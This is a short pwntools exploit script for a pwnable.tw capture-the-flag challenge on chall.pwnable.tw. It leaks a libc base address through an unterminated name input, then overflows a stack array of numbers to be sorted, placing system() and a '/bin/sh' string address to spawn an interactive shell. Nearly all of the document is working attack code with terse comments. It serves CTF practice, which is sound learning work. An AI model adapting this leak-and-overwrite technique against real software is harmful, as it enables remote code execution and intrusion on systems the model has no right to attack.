###OOB -> stack overflow

from pwn import *

###Tips
#libc = ELF('./libc_32.so.6')
#libc.address = <ADDR>
#print(libc.symbols[b'system'])
#for item in libc.search(b'/bin/sh\x00'):
#    print(hex(item))

###Useful addr
#  libc2.23
system_offset = 0x3a940
bin_sh_str_offset = 0x158e8b
libc_got_plt = 0x1b0000

r = remote('chall.pwnable.tw',10101)

###leak address possible since no null terminate after input
r.sendafter('name :','a'*25)
r.recvuntil('a'*25)
###quite tricky here, since last byte of libc_got_plt is \x00
### we need to add an additional a to the string and pad the \x00 back
libc_base = u32(b'\x00'+r.recvuntil(b'\xf7'))-libc_got_plt

###pad inputs and
r.sendlineafter('sort :','47')
for i in range(12):
    r.sendlineafter('number : ',str(0))
for i in range(7):
    r.sendlineafter('number : ',str(libc_base+system_offset))
r.sendlineafter('number : ',str(libc_base+bin_sh_str_offset))
r.sendlineafter('number : ','a')
r.interactive()
